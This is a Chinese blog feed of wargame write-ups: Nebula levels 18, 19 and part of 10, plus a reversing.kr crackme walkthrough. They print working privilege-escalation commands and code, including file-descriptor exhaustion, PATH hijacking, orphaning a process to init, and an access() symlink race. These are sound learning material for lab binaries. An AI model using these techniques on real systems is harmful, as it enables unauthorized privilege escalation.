0x08048d01 &amp;lt;+177&amp;gt;:  mov    0x60(%esp),%ebx
0x08048d05 &amp;lt;+181&amp;gt;:  mov    0x64(%esp),%esi
0x08048d09 &amp;lt;+185&amp;gt;:  mov    0x68(%esp),%edi
0x08048d0d &amp;lt;+189&amp;gt;:  add    $0x6c,%esp
0x08048d10 &amp;lt;+192&amp;gt;:  ret    
0x08048d11 &amp;lt;+193&amp;gt;:  lea    0x0(%esi,%eiz,1),%esi
0x08048d18 &amp;lt;+200&amp;gt;:  mov    0x804b0ac,%eax
0x08048d1d &amp;lt;+205&amp;gt;:  test   %eax,%eax
0x08048d1f &amp;lt;+207&amp;gt;:  je     0x8048cf4 &amp;lt;login+164&amp;gt;
0x08048d21 &amp;lt;+209&amp;gt;:  movl   $0x8048ef0,0xc(%esp)
0x08048d29 &amp;lt;+217&amp;gt;:  movl   $0x8048fbc,0x8(%esp)
0x08048d31 &amp;lt;+225&amp;gt;:  movl   $0x1,0x4(%esp)
0x08048d39 &amp;lt;+233&amp;gt;:  mov    %eax,(%esp)
0x08048d3c &amp;lt;+236&amp;gt;:  call   0x8048770 &amp;lt;__fprintf_chk@plt&amp;gt;
0x08048d41 &amp;lt;+241&amp;gt;:  jmp    0x8048cf4 &amp;lt;login+164&amp;gt;
0x08048d43 &amp;lt;+243&amp;gt;:  call   0x8048690 &amp;lt;__stack_chk_fail@plt&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;结合C程序一起看：&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;fp = fopen(PWFILE, &amp;quot;r&amp;quot;);
  if(fp) {
    char file[64];

    if(fgets(file, sizeof(file) - 1, fp) == NULL) {
      dprintf(&amp;quot;Unable to read password file %s\n&amp;quot;, PWFILE);
      return;
    }
                fclose(fp);
    if(strcmp(pw, file) != 0) return;    
  }
  dprintf(&amp;quot;logged in successfully (with%s password file)\n&amp;quot;, 
    fp == NULL ? &amp;quot;out&amp;quot; : &amp;quot;&amp;quot;);

  globals.loggedin = 1;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果if判断为假，就可以直接把全局结构体中的登陆信息设置为1。查阅fopen后可知当文件无法打开时会返回NULL，所以可以想办法让文件无法打开。和反汇编程序对比，可以看到，&lt;code&gt;fclose(fp)&lt;/code&gt;在实际程序中并不存在，也就是文件句柄打开后并不关闭。系统中每个进程可以打开的文件句柄是有限的，当超出限制，资源枯竭，就会返回NULL。因此可以想办法让句柄资源枯竭。&lt;/p&gt;
&lt;p&gt;Linux系统中的可以通过以下方式查看当前打开文件句柄和最大可打开句柄：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;cat /proc/sys/fs/file-nr
cat /proc/sys/fs/file-max
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;但是一般来说，系统会对每个用户的进程作出资源的限制。可以使用ulimit查看限制后的资源情况：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level18@nebula:/home/flag18$ ulimit -Hn
4096
level18@nebula:/home/flag18$ ulimit -Sn
1024
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到，文件句柄数量硬阈值设定为4096，但对于当前用户只有1024。换句话说，创建1024个文件句柄后就不能再创建了。&lt;/p&gt;
&lt;p&gt;那程序本身会占用多少文件句柄呢？这里我们可以先做个试验，首先运行flag18，并进入调试模式，调试等级最高（因为我们需要调试信息）：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level18@nebula:/home/flag18$ ./flag18 -d /tmp/dbg17 -vvv
login level18

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;输入&lt;code&gt;login level18&lt;/code&gt;并回车，此时理论上应该打开了1个密码文件和1个调试信息文件。但是，当我们切换到TTY2并采用root登陆后（具体方法见level07），使用lsof查看进程句柄信息：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;root@nebula:~# lsof -c flag18
COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME
flag18  11848 flag18  cwd    DIR   0,18      100  13132 /home/flag18
flag18  11848 flag18  rtd    DIR   0,18      260   6744 /
flag18  11848 flag18  txt    REG    7,0    12216  12922 /home/flag18/flag18
flag18  11848 flag18  mem    REG    7,0  1544392  44973 /lib/i386-linux-gnu/libc-2.13.so
flag18  11848 flag18  mem    REG    7,0   126152  44978 /lib/i386-linux-gnu/ld-2.13.so
flag18  11848 flag18    0u   CHR  136,0      0t0      3 /dev/pts/0
flag18  11848 flag18    1u   CHR  136,0      0t0      3 /dev/pts/0
flag18  11848 flag18    2u   CHR  136,0      0t0      3 /dev/pts/0
flag18  11848 flag18    3u   REG   0,19       80 362729 /tmp/dbg17
flag18  11848 flag18    4r   REG   0,17       31 344165 /home/flag18/password
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到，文件实际打开了5个文件句柄，除了刚才说到的两个，还有标准输入、标准输出和错误输出。也就是说对于文件句柄，程序本身占有3个，flag18程序因为调试占有1个，剩下的1024-3-1=1020才是给密码文件的，也就是至少1021个密码文件的打开才能&lt;code&gt;fopen()&lt;/code&gt;失效。于是构造如下命令：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;python -c 'print &amp;quot;login level8\r\n&amp;quot;*1021' | ~flag18/flag18 -d /tmp/dbg17 -vvv
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;查看一下调试文件：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level18@nebula:/home/flag18$ cat /tmp/dbg17 | tail
got [login level8] as input
attempting to login
got [login level8] as input
attempting to login
got [login level8] as input
attempting to login
got [login level8] as input
attempting to login
logged in successfully (without password file)
got [] as input
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以发现已经登录成功了。下面我们就要调用shell参数：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level18@nebula:/home/flag18$ python -c 'print &amp;quot;login level8\r\n&amp;quot;*1021+&amp;quot;shell\r\n&amp;quot;' | ~flag18/flag18 -d /tmp/dbg17 -vvv
/home/flag18/flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;利用资源极限这种方式，虽然绕过了登录，却没有办法再创建shell，不过幸好程序本身给我们提供了&lt;code&gt;closelog&lt;/code&gt;，所以我们只需要创建1021个文件绕过登录，之后关闭1个句柄，再打开shell就可以了，于是构造如下命令：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;python -c 'print &amp;quot;login level8\r\n&amp;quot;*1021+&amp;quot;closelog\r\nshell\r\n&amp;quot;' | ~flag18/flag18 -d /tmp/dbg17 -vvv
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;执行后shell返回：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;flag18 -d /tmp/dbg17 -vvv
/home/flag18/flag18: -d: invalid option
Usage:  /home/flag18/flag18 [GNU long option] [option] ...
    /home/flag18/flag18 [GNU long option] [option] script-file ...
GNU long options:
    --debug
    --debugger
    --dump-po-strings
    --dump-strings
    --help
    --init-file
    --login
    --noediting
    --noprofile
    --norc
    --posix
    --protected
    --rcfile
    --restricted
    --verbose
    --version
Shell options:
    -irsD or -c command or -O shopt_option      (invocation only)
    -abefhkmnptuvxBCHP or -o option
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这其实是sh本身的问题，因为它把后面的那些命令也认为是它的参数了，而它没有-d参数，所以报错。这里用&lt;code&gt;--init-file&lt;/code&gt;参数可以让它忽略后面的参数。重新构造命令：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;python -c 'print &amp;quot;login level18\r\n&amp;quot;*1021+&amp;quot;closelog\r\nshell\r\n&amp;quot;' | ~flag18/flag18 --init-file -d /tmp/dbg17 -vvv &amp;amp;&amp;gt;/tmp/log17
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里我把整个shell中的输出都放到/tmp/log17中是为了便于查看，shell本身窗口太小了。查阅log17文件发现：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'n'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 't'
/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'f'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'l'
/home/flag18/flag18: invalid option -- 'e'
/tmp/dbg17: line 1: Starting: command not found
/tmp/dbg17: line 2: got: command not found
/tmp/dbg17: line 3: attempting: command not found
/tmp/dbg17: line 4: got: command not found
/tmp/dbg17: line 5: attempting: command not found
/tmp/dbg17: line 6: got: command not found
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;开头调用了&lt;code&gt;Starting&lt;/code&gt;和&lt;code&gt;got&lt;/code&gt;命令，但是两个命令都不存在。那就构造一个命令，这样就能利用漏洞了（/tmp目录下）：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;echo &amp;quot;/bin/getflag&amp;quot; &amp;gt; Starting &amp;amp;&amp;amp; chmod +x Starting
PATH=/tmp:$PATH
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;再次执行后查看结果：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level18@nebula:/tmp$ cat /tmp/log17 | head -20
/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'n'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 't'
/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'f'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'l'
/home/flag18/flag18: invalid option -- 'e'
You have successfully executed getflag on a target account
/tmp/dbg17: line 2: got: command not found
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这样第一种方法已经实现。其他方法待续……&lt;/p&gt;
&lt;h1&gt;Nebula level19&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a flaw in the below program in how it operates.&lt;/p&gt;
&lt;p&gt;下面的程序执行方式有漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;

  /* Get the parent's /proc entry, so we can verify its user id */

  snprintf(buf, sizeof(buf)-1, &amp;quot;/proc/%d&amp;quot;, getppid());

  /* stat() it */

  if(stat(buf, &amp;amp;statbuf) == -1) {
    printf(&amp;quot;Unable to check parent process\n&amp;quot;);
    exit(EXIT_FAILURE);
  }

  /* check the owner id */

  if(statbuf.st_uid == 0) {
    /* If root started us, it is ok to start the shell */

    execve(&amp;quot;/bin/sh&amp;quot;, argv, envp);
    err(1, &amp;quot;Unable to execve&amp;quot;);
  }

  printf(&amp;quot;You are unauthorized to run this program\n&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首先还是分析程序执行流程：程序启动后调用getppid()函数获取父进程id，之后查找/proc下该id进程是否属于root，如果是root的，则可以根据参数执行shell命令。&lt;/p&gt;
&lt;p&gt;首先去/proc下面看看哪些进程属于root，注意到/proc/1。回想一下Linux进程机制，在父进程创建子进程后，如果父亲在子进程退出前因为种种原因结束了，那子进程就归pid=1的init进程管理了。而init是属于root，所以，我们可以设计一个程序，启动子进程后立马退出，这样子进程的新父进程就是init了：&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
int main(int argc, char *argv[]) {
    pid_t p;
    p = fork();
    if (p == 0) //child
    {
        sleep(1);
        execl(&amp;quot;/home/flag19/flag19&amp;quot;, &amp;quot;/bin/sh&amp;quot;, &amp;quot;-c&amp;quot;, &amp;quot;/bin/getflag &amp;gt; /tmp/flag19.txt&amp;quot;, NULL);
    }
    else if(p &amp;gt; 0) //parent
        exit(0);

    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;其中让子进程等待一秒后运行指令，保证父进程退出并让init接管。sh的-c参数用于将输入参数作为指令代替标准输入。&lt;/p&gt;
&lt;p&gt;Voila！全部搞定！&lt;/p&gt;
&lt;h1&gt;后记&lt;/h1&gt;
&lt;p&gt;开始玩Nebula之后无法自拔，天天深陷其中，可能这就是所谓的痴迷吧。&lt;/p&gt;
&lt;p&gt;刚做Nebula的时候觉得真的好简单，以为三四天就能完成，很可惜到后面越做越慢，很多周边知识都是边查边补充，碰到不懂得可能就得完整的系统的学习，用了不少时间，但是非常值得。&lt;/p&gt;
&lt;p&gt;虽然现在20道题都已经完成，但是有些题目的方法还比较局限，待我学会高级的技巧后，会再回来补充一些思路或方案。&lt;/p&gt;
&lt;p&gt;希望这20道题的Writeup能给你帮助。如果你已经完成，那就和我一起进军下一个级别的挑战！&lt;/p&gt;</summary><category term="exploit-exercises"></category><category term="nebula"></category><category term="wargame"></category><category term="hacking"></category><category term="exploit"></category></entry><entry><title>reversing.kr Replace Walkthrough</title><link href="http://blog.yyx.name/posts/reversing-kr-replace.html" rel="alternate"></link><updated>2014-09-13T20:18:00+08:00</updated><author><name>GreatYYX</name></author><id>tag:blog.yyx.name,2014-09-13:posts/reversing-kr-replace.html</id><summary type="html">&lt;h1&gt;黑盒实验&lt;/h1&gt;
&lt;p&gt;拿到程序后运行，出现一个包含输入框对话框，不能输入字母和特殊符号，只能输入0-9这10个数字。&lt;/p&gt;
&lt;p&gt;尝试输入数字提交后，程序崩溃。连续实验了几次都一样，包括留空提交。一开始以为是兼容性问题，用兼容模式尝试运行，结果仍然一样。&lt;/p&gt;
&lt;h1&gt;调试和分析&lt;/h1&gt;
&lt;p&gt;首先查壳，拖入PEiD，&lt;code&gt;Microsoft Visual C++ 6.0&lt;/code&gt;，无壳。&lt;/p&gt;
&lt;p&gt;拖入OD，查找Name，根据只能输入数字为线索，找到&lt;code&gt;GetDlgItemInt&lt;/code&gt;，跟到代码，下断。程序跑起来，输入任意数字后单步步过运行，逐渐缩小范围，多次测试后找到使程序崩溃的地方——&lt;code&gt;call Replace.0040466F&lt;/code&gt;，进去看程序代码：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;0040466F   $  C600 90                     mov byte ptr ds:[eax],0x90
00404672   ?  C3                          retn
00404673   ?  0081 05D08440               add byte ptr ds:[ecx+0x4084D005],al
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这段代码做了一件很好玩的事：把1个byte的0x90填充到ds:[eax]处。ds:[eax]说明这个具体的位置是根据当时eax寄存器的值确定的，0x90如果在数据段就是个不可打印的数据，而在代码段则是&lt;code&gt;NOP&lt;/code&gt;指令。这里的设想一定要大胆，很可能这段话是用来填充代码段的——也就是说，为了“废掉”某个或者某段指令（当然&lt;code&gt;NOP&lt;/code&gt;在Exploit的时候很可能做为模糊跳转技术中的缓冲）。不过目前状态eax的值不在ds指向的范围内，因此造成程序崩溃。&lt;/p&gt;
&lt;p&gt;虽然现在找出了崩溃点，不过貌似没什么作用，我们重新加载程序起来，输入123456，还是断在刚才的地方：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;00401050   .  6A 00         push 0x0                                 ; /IsSigned = FALSE
00401052   .  6A 00         push 0x0                                 ; |pSuccess = NULL
00401054   .  68 EA030000   push 0x3EA                               ; |ControlID = 3EA (1002.)
00401059   .  56            push esi                                 ; |hWnd
0040105A   .  FF15 9C504000 call dword ptr ds:[&amp;lt;&amp;amp;USER32.GetDlgItemIn&amp;gt;; \GetDlgItemInt
00401060   .  A3 D0844000   mov dword ptr ds:[0x4084D0],eax
00401065   .  E8 05360000   call Replace.0040466F
0040106A   .  33C0          xor eax,eax
0040106C   .  E9 1F360000   jmp Replace.00404690
00401071   &amp;gt;  EB 11         jmp XReplace.00401084
00401073   .  68 34 60 40 0&amp;gt;ascii &amp;quot;h4`@&amp;quot;,0                           ;  Correct!
00401078   .  68 E9030000   push 0x3E9                               ; |ControlID = 3E9 (1001.)
0040107D   .  56            push esi                                 ; |hWnd
0040107E   .  FF15 A0504000 call dword ptr ds:[&amp;lt;&amp;amp;USER32.SetDlgItemTe&amp;gt;; \SetDlgItemTextA
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;大致看一下这段代码，获取输入数据后call一次，jmp2次之后就到了Correct提示的地方。这个大致的代码分布记在心中，继续往下分析。&lt;/p&gt;
&lt;p&gt;可以看到在&lt;code&gt;GetDlgItemInt&lt;/code&gt;后把值写到了ds:[0x4084D0]，长度为dword。在数据窗口跳转到这个地址（可以在数据上下内存断点做监控）：&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;004084D0  40 E2 01 00 00 00 00 00 00 00 00 00 00 00 00     @?.............
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;发现写入值为01E240（就是16进制的123456）。这里注意几点，第一是存储的顺序为little-endian，第二是因为读入的是int所以长度为dword，第三直接存储了这个数字而没有转化成字符串。&lt;/p&gt;
&lt;p&gt;之后进入一个函数&lt;code&gt;call Replace.0040466F&lt;/code&gt;，跟进去：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;0040466F   $  E8 06000000   call Replace.0040467A
00404674      81            db 81
00404675   .  05 D0844000   add eax,Replace.004084D0
0040467A   .  C705 16604000&amp;gt;mov dword ptr ds:[0x406016],0x619060EB
00404684   .  E8 00000000   call Replace.00404689
00404689  /$  FF05 D0844000 inc dword ptr ds:[0x4084D0]
0040468F  \.  C3            retn
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到&lt;code&gt;0040466F&lt;/code&gt;的函数用call的办法跳转到了&lt;code&gt;0040467A&lt;/code&gt;（call当jmp用），这样反汇编器在反汇编的时候会从&lt;code&gt;0040467A&lt;/code&gt;这个地址开始汇编，而被截断处前面这段机器码由于无法构成一个或几个完整的指令，因此被反汇编成了一个数据（&lt;code&gt;db 81&lt;/code&gt;）+一句指令。之后程序把0x619060EB这个立即数写入ds:[0x406016]，似乎没什么用。之后又通过call来当jmp来用，跳转到下面一句话，刚才在ds:[0x4084D0]保存的值自增1。之后retn又跳回&lt;code&gt;00404689&lt;/code&gt;再执行一遍自增。之后再retn，此时return到了&lt;code&gt;00404674&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;但是&lt;code&gt;00404674&lt;/code&gt;是&lt;code&gt;db 81&lt;/code&gt;啊，不是指令！对，这就是这题最有意思的地方，一段机器码用不同的方式解析，得到不同的运行结果。此时需要让OD冲洗理解一下这段代码，在&lt;code&gt;00404674&lt;/code&gt;上BackSpace，此时，还是上面那段机器码，但反汇编代码变成了这样：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;0040466F   $  E8 06000000   call Replace.0040467A
00404674      8105 D0844000&amp;gt;add dword ptr ds:[0x4084D0],0x601605C7
0040467E   ?  40            inc eax
0040467F   ?  00EB          add bl,ch
00404681   ?  60            pushad
00404682   ?  90            nop
00404683   ?  61            popad
00404684   .  E8 00000000   call Replace.00404689
00404689  /$  FF05 D0844000 inc dword ptr ds:[0x4084D0]
0040468F  \.  C3            retn
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这段代码把ds:[0x4084D0]里面的值加了0x601605C7，之后这些指令似乎没作用，到&lt;code&gt;00404689&lt;/code&gt;完成自增，retn，再自增，然后这个奇怪的函数总算返回了。&lt;/p&gt;
&lt;p&gt;还记得上面说过的两个jmp吗？现在进入第一个jmp：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;00404690   &amp;gt; \A1 D0844000   mov eax,dword ptr ds:[0x4084D0]
00404695   .  68 9F464000   push Replace.0040469F
0040469A   .  E8 EAFFFFFF   call Replace.00404689
0040469F   .  C705 6F464000&amp;gt;mov dword ptr ds:[0x40466F],0xC39000C6
004046A9   .  E8 C1FFFFFF   call Replace.0040466F
004046AE   .  40            inc eax
004046AF   .  E8 BBFFFFFF   call Replace.0040466F
004046B4   .  C705 6F464000&amp;gt;mov dword ptr ds:[0x40466F],0x6E8
004046BE   .  58            pop eax
004046BF   .  B8 FFFFFFFF   mov eax,-0x1
004046C4   .^ E9 A8C9FFFF   jmp Replace.00401071
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首先取出ds:[0x4084D0]中的值放入eax，之后又跳到前面那个ds:[0x4084D0]自增的地方，自增了1次。接着执行&lt;code&gt;0040469F&lt;/code&gt;，这句指令把0xC39000C6写入ds:[0x40466F]，0x40466F就是前面程序崩溃的地址啊！也就是说，ds:[0x40466F]处是代码（数据段当代码段执行），所以0xC39000C6其实是当做指令来使用的（0xC39000C6就是让程序崩溃的那段程序的机器码），果然之后马上call了0040466F。然后eax增1，再call 0040466F，再把0x6E8放入ds:[0x40466F]（依然是当做指令执行的数据，替换崩溃代码）。之后善后返回到&lt;code&gt;00401071&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这里先不要执行，顺一下思路：此处取出ds:[0x4084D0]中的内容到eax后，执行崩溃函数，然后eax=eax+1，再执行崩溃函数。而前面分析崩溃函数可以用来抹去代码段中一个byte，这里调用两次就是2byte。回去看获取用户输入后的那段代码：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;...
00401071   &amp;gt;  EB 11         jmp XReplace.00401084
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这是第二个jmp，两个字节机器码，目前这个jmp返回后就会执行这个&lt;code&gt;00401071&lt;/code&gt;的jmp，而这个jmp把我们原来可以顺序执行到的Correct给绕开了！所以，我们要“废掉”这个jmp。于是乎，回到EIP所在位置，之后把eax改成&lt;code&gt;00401071&lt;/code&gt;（第二个jmp的地址），执行后跳回&lt;code&gt;00401071&lt;/code&gt;，这个时候程序变成了：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;00401071   &amp;gt; /90            nop
00401072   ? |90            nop
00401073   . |68 34 60 40 0&amp;gt;ascii &amp;quot;h4`@&amp;quot;,0                           ;  Correct!
00401078   . |68 E9030000   push 0x3E9                               ; |ControlID = 3E9 (1001.)
0040107D   . |56            push esi                                 ; |hWnd
0040107E   . |FF15 A0504000 call dword ptr ds:[&amp;lt;&amp;amp;USER32.SetDlgItemTe&amp;gt;; \SetDlgItemTextA
00401084   &amp;gt; |B8 01000000   mov eax,0x1
00401089   . |90            nop
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;第二个可恶的jmp被成功干掉，并顺利执行了Correct！&lt;/p&gt;
&lt;p&gt;到这里就快成功了！下面我们需要做很重要的一步，让程序自己算出正确的eax并完成整个逻辑，最终弹出正确的提示。&lt;/p&gt;
&lt;p&gt;回过头完整整理一下程序流程：获取用户输入 --&amp;gt; 存入ds:[0x4084D0]（命名为a） --&amp;gt; a=a+2 --&amp;gt; a=a+0x601605C7 --&amp;gt; a=a+2 --&amp;gt; a作为目标地址（0x00401071）抹去2个byte --&amp;gt; Done！所以我们需要算出a，a+4+0x601605C7=0x00401071。注意，这里的a的长度是dword，也就是unsigned int。打开calc，算出a为FFFFFFFFA02A0AA6，截取后32bit得到A02A0AA6，转到十进制为2687109798。重新打开程序，输入并获得Correct！&lt;/p&gt;
&lt;h1&gt;总结&lt;/h1&gt;
&lt;p&gt;这题个人感觉还是非常有意思的，不光一段机器码反复利用，还直接把数据当代码解释（可用于动态生成代码执行）。&lt;/p&gt;
&lt;p&gt;这里还有一个细节：为何代码会被反复调用两次。答案很简单，因为利用call当jmp使用还是和直接jmp有区别的，每次call会使得返回地址压栈，因此执行到retn的时候会跳到call之后的语句再执行一遍（这个技巧不知道会不会用于编译器的优化，但是很可能会用于外壳的编写）。&lt;/p&gt;
&lt;p&gt;另外这道题花费时间较长，超过前4个Easy题所用的时间的总和。虽然我写出来的时候逻辑还算是比较简单和清晰的，但实际需要反复调试很多次来理清思路。所以，逆向的Debug是个脑力活，也是体力活T^T。&lt;/p&gt;</summary><category term="reversing.kr"></category><category term="wargame"></category><category term="hacking"></category><category term="reversing"></category></entry><entry><title>Exploit Exercises Nebula level10-14 Writeup</title><link href="http://blog.yyx.name/posts/exploit-exercises-nebula-level-10-14.html" rel="alternate"></link><updated>2014-09-12T22:14:00+08:00</updated><author><name>GreatYYX</name></author><id>tag:blog.yyx.name,2014-09-12:posts/exploit-exercises-nebula-level-10-14.html</id><summary type="html">&lt;h1&gt;Nebula level10&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.&lt;/p&gt;
&lt;p&gt;具有SetUID功能的二进制文件flag10在满足access()系统调用的条件下可以上传任何给定文件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc &amp;lt; 3) {
    printf(&amp;quot;%s file host\n\tsends file to host if you have access to it\n&amp;quot;, argv[0]);
    exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
    int fd;
    int ffd;
    int rc;
    struct sockaddr_in sin;
    char buffer[4096];

    printf(&amp;quot;Connecting to %s:18211 .. &amp;quot;, host); fflush(stdout);

    fd = socket(AF_INET, SOCK_STREAM, 0);

    memset(&amp;amp;sin, 0, sizeof(struct sockaddr_in));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(host);
    sin.sin_port = htons(18211);

    if(connect(fd, (void *)&amp;amp;sin, sizeof(struct sockaddr_in)) == -1) {
      printf(&amp;quot;Unable to connect to host %s\n&amp;quot;, host);
      exit(EXIT_FAILURE);
    }

#define HITHERE &amp;quot;.oO Oo.\n&amp;quot;
    if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
      printf(&amp;quot;Unable to write banner to host %s\n&amp;quot;, host);
      exit(EXIT_FAILURE);
    }
#undef HITHERE

    printf(&amp;quot;Connected!\nSending file .. &amp;quot;); fflush(stdout);

    ffd = open(file, O_RDONLY);
    if(ffd == -1) {
      printf(&amp;quot;Damn. Unable to open file\n&amp;quot;);
      exit(EXIT_FAILURE);
    }

    rc = read(ffd, buffer, sizeof(buffer));
    if(rc == -1) {
      printf(&amp;quot;Unable to read from file: %s\n&amp;quot;, strerror(errno));
      exit(EXIT_FAILURE);
    }

    write(fd, buffer, rc);

    printf(&amp;quot;wrote file!\n&amp;quot;);

  } else {
    printf(&amp;quot;You don't have access to %s\n&amp;quot;, file);
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;看到这长长一段C代码……眼前出现“蛋疼”2字，不过题还是要做的，不打小怪兽，怎么当奥特曼？&lt;/p&gt;
&lt;p&gt;程序逻辑还是很简单，两个参数，第一个是文件路径，第二个是主机ip。程序通过access验证给定路径的文件是否有读取权限，如果有则对指定ip主机的18211端口发送一个HITHERE的字符串（话说上次给Github的大神写邮件人家也是那么打招呼的……），如果发送成功，就读取文件内容之后发送。&lt;/p&gt;
&lt;p&gt;flag10的home目录下有flag10程序和token文件，token对level10没有读取权限。看来又是要绕开权限去读取token的内容。但是应该如何做呢？在翻看了&lt;a href="http://linux.die.net/man/2/access"&gt;access()&lt;/a&gt;的man手册后发现那么一句话：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.&lt;/p&gt;
&lt;p&gt;access()验证权限是有风险的，因为在你验证文件和真正open文件的间隙，文件很可能会被利用！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这个Warning绝对是个完美的Tip，顺顺思路：建立一个假的token文件（有权限读的），然后创建一个软连接指向这个文件。通过验证后利用短暂的间隙，把软连接指向真正的token，这样就狸猫换太子了~&lt;/p&gt;
&lt;p&gt;有了思路，如何实现呢？nc可以创建监听，但是没法在nc的途中快速修改软连接指向（毕竟nc是独占的，无法返回）。于是想到了python。&lt;code&gt;which python&lt;/code&gt;一下，果然装了python，再&lt;code&gt;python -V&lt;/code&gt;，发现python版本2.7.2。直接vim写下python代码（server.py）：&lt;/p&gt;
&lt;pre&gt;&lt;code class="python"&gt;#! /usr/bin/python
import os
from socket import *

HOST = ''
PORT = 18211
BUFSIZ = 4096
ADDR = (HOST, PORT)

tcpSerSock = socket(AF_INET, SOCK_STREAM)
tcpSerSock.bind(ADDR)
tcpSerSock.listen(5)

while True:
    print 'waiting for connection...'
    tcpCliSock, addr = tcpSerSock.accept()
    print 'connected!'

    while True:
        data = tcpCliSock.recv(BUFSIZ)
        if not data:
            break
        if data == '.oO Oo.\n':
            print 'get it baby!'
            os.system('ln -fs /home/flag10/token /home/level10/token')
    tcpCliSock.close()
tcpSerSock.close()
